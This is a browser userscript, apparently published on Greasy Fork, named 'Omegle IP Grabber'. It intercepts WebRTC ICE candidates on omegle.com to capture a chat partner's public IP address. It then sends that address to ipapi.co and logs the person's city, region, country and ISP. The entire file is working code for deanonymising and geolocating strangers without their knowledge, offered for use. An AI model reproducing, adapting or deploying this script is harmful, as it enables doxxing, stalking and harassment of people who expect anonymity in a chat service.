// ==UserScript==
// @name         Omegle IP Grabber by zs4#6528
// @namespace    http://jannitherock.de/
// @version      1.3
// @description  Hol dir die IP von ein paar Scammern
// @author       zs4#6528
// @include      https://omegle.com/*
// @include      https://www.omegle.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/413088/Omegle%20IP%20Grabber%20by%20zs46528.user.js
// @updateURL https://update.greasyfork.org/scripts/413088/Omegle%20IP%20Grabber%20by%20zs46528.meta.js
// ==/UserScript==

(function() {
    'use strict';

window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection
window.RTCPeerConnection = function(...args) {
	const pc = new window.oRTCPeerConnection(...args)
	pc.oaddIceCandidate = pc.addIceCandidate
	pc.addIceCandidate = function(iceCandidate, ...rest) {
		const fields = iceCandidate.candidate.split(' ');
		if (fields[7] === 'srflx') {
			fetch('https://ipapi.co/' + fields[4] + "/json/")
				.then(response => response.json())
				.then(data => obj = data)
                .then(() => console.log("|-------------|"))
				.then(() => console.log("|IP:", obj.ip))
				.then(() => console.log("|Stadt:", obj.city))
				.then(() => console.log("|Region:", obj.region))
				.then(() => console.log("|Land:", obj.country_name))
				.then(() => console.log("|ISP:", obj.org))
                .then(() => console.log("|-------------|"))
				.catch(function() {
					console.log("DEBUG MSG");
				});
		}
		return pc.oaddIceCandidate(iceCandidate, ...rest)
	}
	return pc
}
})();